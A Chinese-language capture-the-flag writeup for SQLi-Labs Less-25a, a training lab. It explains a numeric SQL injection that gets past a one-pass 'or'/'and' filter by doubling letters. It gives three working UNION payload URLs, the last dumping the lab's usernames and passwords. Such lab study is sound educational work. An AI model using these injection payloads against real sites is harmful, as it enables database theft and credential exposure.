【SQLi-Labs】Less-25a 纯数字型双写绕过 Writeup

操作者：何芊宏 | 操作日期：2026.10.26 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 双写绕过, 联合查询

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-25a (GET - Trick with OR & AND - Blind Based)
  • 提示：纯数字型注入，过滤了关键字，注释符可用，无报错回显。

2. 核心原理与前置分析

根据源码审计，本关卡后台 SQL 为 $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";。

  • 上下文：纯数字型（无单引号、无括号）。
  • 过滤机制：使用 preg_replace 单次替换 or 和 and，存在双写绕过漏洞。
  • 报错屏蔽：mysql_error() 被注释，无法进行报错注入，但联合查询（UNION）可用。

3. 操作步骤与解析

第一步：确认注入点与占位

输入 URL：?id=0 union select 1,database(),3-- -

回显现象：页面第 2 列回显 security。

解释与原理：由于是纯数字型，无需闭合引号。使用 0 作为前置条件（原库中不存在 id=0 的数据），让前置查询为空，从而回显后方的 UNION SELECT 结果。-- - 用于注释掉原代码尾部的 LIMIT 0,1。

第二步：双写绕过查询表名

输入 URL：?id=0 union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()-- -

回显现象：第 2 列回显 emails,referrers,uagents,users。

解释与原理：由于 or 被过滤，information 关键字必须双写为 infoorrmation。系统的正则替换删掉中间的 or，剩下合法的 information。

第三步：双写绕过脱库

输入 URL：?id=0 union select 1,group_concat(username,0x3a,passwoorrd),3 from users-- -

回显现象：第 2 列回显所有账号密码，包含 Dumb:Dumb,Angelina:I-kill-you 等。

解释与原理：password 关键字包含 or，必须双写为 passwoorrd 绕过过滤。

4. 踩坑记录与复盘

  • 上下文误判：切勿习惯性地在数字型注入点后添加单引号或括号，否则会导致语法报错。
  • 非递归过滤：双写绕过的核心在于系统的正则只执行一次，利用重叠字符生成敏感词。

5. 知识点总结

  • 双写绕过：`infoorrmation_schema` 与 `passwoorrd`。
  • 数字型注入：无需闭合任何符号，直接用 0 或 -1（若无减号过滤）占位进行 UNION 注入。
